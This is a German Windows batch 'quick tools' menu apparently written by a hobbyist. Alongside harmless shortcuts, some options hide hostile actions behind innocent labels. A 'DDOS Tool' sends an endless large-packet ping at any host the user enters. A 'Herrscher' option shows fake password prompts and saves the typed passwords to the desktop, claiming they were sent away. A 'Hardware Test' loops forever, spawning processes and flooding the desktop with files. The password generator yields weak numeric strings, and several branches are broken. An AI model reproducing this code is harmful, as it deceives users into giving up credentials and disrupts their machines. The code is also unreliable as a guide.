@echo off
title FaserF's Quick Tools V1.4.0
color 89
:Start
cls
echo             ================================
echo                   FaserF's Quick Tools
echo             ================================
echo.
echo   [1]    Meine Website
echo   [2]    
echo   [3]    Regestrierungs Editor
echo   [4]    Rechner :D
echo   [5]    Kopiere auf USB Stick
echo   [6]    Besuche mich auf Steam!
echo   [7]    WinKeyViewer (Wird mir waaaahrscheinlich zugesandt ;D)
echo   [8]    Datentraegerbereinigung
echo   [9]    Passwort Generator
echo   [10]   DDOS Tool (Max Ping)
echo   [11]   ADB und Fast-b00t
echo   [12]   Easteregg #2
echo   [13]   Playlist
echo   [S]  Settings
echo   [0]    EXIT
echo.
echo            INFO: Herzlich willkommen zu meiner Mini Tool Sammlung :)
echo.

:Auswahl
set asw=0
set /p asw="Bitte Auswahl eingeben: "

if %asw%==1 start "" http://www.faserf.github.io
if %asw%==2 
if %asw%==3 start regedit.exe
if %asw%==4 start calc.exe
if %asw%==5 goto STICK
if %asw%==6 start "" http://www.steamcommunity.com/id/FaserF
if %asw%==7 goto WinKeyViewer
if %asw%==8 start cleanmgr /sageset:1
if %asw%==9 goto :PasswordGenerator
if %asw%==10 goto :DDOS
if %asw%==11 goto :AD
if %asw%==12 goto :EA
if %asw%==13 goto :Playlist

if %asw%==S goto :Settings
if %asw%==0 goto :Exit
if %asw%==exit goto :Exit

echo Nächste Auswahl? Bitte eine Zahl von oben waehlen!
goto:Auswahl

:STICK
cls
echo.
echo             ========================
echo             USB Stick Syncronisation
echo             ========================
echo.
echo   [1] Syncronisiere Musik (Komprimiert)
echo   [2] Syncronisiere Musik
echo   [3] Syncronisiere Spiele
echo   [0] Zurueck

set asw=0
set /p asw="Bitte Auswahl eingeben: "

if %asw%==1 echo "Funktioniert nur bei installiertem 7ZIP!"
	call 7z -t7z -mx=1 -ms=off -slp a "C:\Programmierung\dev_%date%.7z" "e:\" -x!"e:\RECYCLER"
	-x!"C:\Daten\%username%\Documents\My Music" -x!"e:\Backup"
if %asw%==2 xcopy C:\Daten\%username%\Documents\My Music E:\Backup
if %asw%==3 echo Leider noch nicht verfügbar!
if %asw%==0 goto :Start
goto Start

:WinKeyViewer
start WinKeyViewer.vbs
echo Warte ca 7 Sek. um mir den WinKey zuzusenden :D
ping 192.0.2.2 -n 1 -w 10000 > nul
goto :Start

:PasswordGenerator
cls
echo Waehle die Anzahl an zufaelligen Passwoertern:
echo ----------------------------------------­-----------------------
echo 1) 1 Random Password
echo 2) 5 Random Passwords
echo 3) 10 Random Passwords
echo Input your choice
set input=
set /p input= Choice:
if %input%==1 goto Eins if NOT goto Start2
if %input%==2 goto Fuenf if NOT goto Start2
if %input%==5 goto Fuenf if NOT goto Start2
if %input%==3 goto Zehn if NOT goto Start2
if %input%==10 goto Zehn if NOT goto Start2
:Eins
cls
echo Ein zufaelliges Passwort waere %random%%random%
echo Was als naechstes?
echo 1) Zurueck zur Startseite
echo 0) Exit
set input=
set /p input= Choice:
if %input%==1 goto :Start
if %input%==0 goto :Exit
:Fuenf
cls
echo Hier sind 5 zufaellige Passwoerter %random%%random%, %random%, %random%%random%%random%, %random%%random%, %random%.
echo Was als naechstes?
echo 1) Zurueck zur Startseite
echo 0) Exit
set input=
set /p input= Choice:
if %input%==1 goto :Start
if %input%==0 goto :Exit
:Zehn
cls
echo Die 10 zufaelligen Passwoerter lauten %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%, %random%
echo Was als naechstes?
echo 1) Zurueck zur Startseite
echo 0) Exit
set input=
set /p input= Choice:
if %input%==1 goto :Start
if %input%==0 goto :Exit

:DDOS
set input=
set /p input= Tippe nun eine URL (z.B. www.google.de) oder IP (z.B. 88.217.135.44) ein, die du mit dem maximum anpingen willst:
if %input%==goto A if NOT B
echo Starte...
ping localhost>nul
echo Um den DDOS zu stoppen nutze CTRL + C
echo Wenn es crashed hast du eine ungueltige Adresse eingegeben!
ping localhost>nul
ping %input% -t -l 6550

:AD
echo WIP - Work in Progress. Bald verfuegbar!
pause
goto :Start

:EA
echo Wie lautet das Passwort? (Tippe "exit" um zurueck zu gelangen!)
set/p "pass=>"
if not %pass% == BitteSehr goto :check
msg * "Passwort ist richtig!!!"
goto :correct
:check
if not %pass% == exit goto :fail
goto :Start
:fail
msg * "Passwort ist falsch!!!"
goto :EA
:correct
msg * "Easter-EGG! :)"
echo "Let's Party
pause
goto :Party
:Party
cls
color 08
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 09
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 08
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 09
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 08
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 09
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 09
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 0D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 78
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 79
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 78
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 79
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7A
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7B
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7C
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
color 7D
echo "P-A-R-T-Y HARD - ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ - PARTY"
goto :Party

:Settings
cls
echo             =======================================
echo                   FaserF's Quick Tools Settings
echo             =======================================
echo.
echo   [1]   Aendere die Farbe
echo   [2]   DIE Html Website schlecht hin?
echo   [3]   Eigenwerbung mit SPAM?
echo   [4]   Zeige *DAS* Bild
echo   [5]   Zeig mir das EasterEgg Passwort
echo   [6]   Werde der Herrscher!
echo   [7]   Schau dir das Changelog an
echo   [8]   "Hardware" Test???
echo   [S] 	Reload Settings
echo   [0]   EXIT
echo.
echo        Tipp: Es existierrn zwei Easter Eggs.
echo.

set asw=0
set /p asw="Bitte Auswahl eingeben: "
if %asw%==1 goto :Color
if %asw%==2 start FaserF.html
if %asw%==3 goto :SPAM
if %asw%==4 goto :PIC
if %asw%==5 goto :Herrscher
if %asw%==6 goto :Herrscher
if %asw%==7 goto :Changelog
if %asw%==8 goto :DenkMehrMit
if %asw%==S goto :Settings
if %asw%==0 goto :Start
if %asw%==exit goto :Start
:Color
cls
echo             ================================
echo                   Waehle deine Farbe
echo             ================================

echo.
echo   [1]   Schwarz - Dunkelgrau
echo   [2]   Schwarz - Blau
echo   [3]   Schwarz - Gruen
echo   [4]   Schwarz - Weiss
echo   [5]   Hellgrau - Magenta
echo   [6]   Hellgrau - Gruen
echo   [7]   Hellgrau - Blau (Standard)
echo   [S] Reload Settings
echo   [0]   EXIT
echo.
echo        ACHTUNG: Scheinbar noch verbuggt!
echo.

set asw=0
set /p asw="Bitte Auswahl eingeben: "
if %asw%==1 color 08 goto :Start
if %asw%==2 color 09 goto :Start
if %asw%==3 color 0A goto :Start
if %asw%==1 color 0F goto :Start
if %asw%==2 color 7D goto :Start
if %asw%==3 color 7A goto :Start
if %asw%==1 color 79 goto :Start
if %asw%==S goto :Settings
if %asw%==0 goto :Start
if %asw%==exit goto :Start
:Changelog
cls
echo WAS GIBT ES NEUES?
echo.
echo.
echo V1.4.X:
echo - Playlist Generator
echo - Settings: Bug fixes
echo - Code Optimierung
echo.
echo.
echo V1.3.X:
echo - Neues Easteregg #2
echo - Neu: Settings
echo - Easteregg bug fixes
echo - mehrere neue Settings Optionen
echo.
echo V1.2.X
echo - Bug fixes
echo - Keine Ahnung, viele neue Features
echo.
echo V1.0.X - V1.1.X
echo - Keine Ahnung, first release
echo - Bug fixes
echo.
echo.
pause
goto :Settings
:Herrscher
runas /user:Admnistrator Systemsteuerung.exe
set asw=0
set /p asw="Geben Sie das Kennwort fuer "%username%" ein:"
echo Das Passwd von %username% lautet "%asw%" und wurde nun direkt an mich gesandt! > C:\Users\%username%\Desktop\IchHabDeinUserPW.txt
set asw=0
set /p asw1="Geben Sie das Kennwort fuer "Administrator" ein:"
echo Das Admin Passwort lautet "%asw%" und wurde nun direkt an mich gesandt! > C:\Users\%username%\Desktop\IchHabDeinAdminPW.txt
msg * "Das EasterEgg Passwort lautet 'BitteSehr' du fauler Sack! Aber vergiss nicht das andere Easter Egg (auch in den Settings :). P.S. Schau mal auf den Desktop!"
goto :Start
:PIC
start Pic.jpg
goto :Start
:SPAM
start "" http://www.steamcommunity.com/id/FaserF
start "" http://www.youtube.com/FaserF11
start "" http://www.facebook.com/FaserF11
start "" http://www.twitter.com/FaserF11
start FaserF.html
goto :PIC
:DenkMehrMit
color 0A
start DoNotStart.bat
msg * "Lass uns einen kleinen Hardware Test machen. Kleiner Tipp: 10 Sekunden lang den Power Button drücken :D"
echo DenkMehrMit > C:\Users\%username%\Desktop\DenkMehrMit%random%.txt
echo SPAM > C:\Users\%username%\Desktop\SPAM\DasIstKeinSpam%random%.txt
echo "Woooohooooooooooo"
goto :DenkMehrMit

:Playlist
:HowTo

echo             ======================================
echo                 FaserF's Quick Playlist Writer
echo             ======================================
echo.
echo		Kopiere diese Batch Datei in einen Ordner in 
echo		dem all deine Lieder, welche in die Playlist 
echo		sollen sind.
echo.
pause
Pushd "%1"
chcp 1252
dir /b /o:n *.mp* *.ogg *.fla* *.ape *.aac *.wv *.wav >MixedPlaylist.m3u
copy MixedPlaylist.m3u > C:\Users\%username%\OneDrive\Musik\Wiedergabelisten
start MixedPlaylist.m3u
goto :Start

:Exit
msg * "Vielen Dank fuer die Nutzung von FaserF Quick Tools. Einen schoenen Tag wuenscht dir FaserF ÜÜÜäöü ÄÖÜÜÜ"
exit
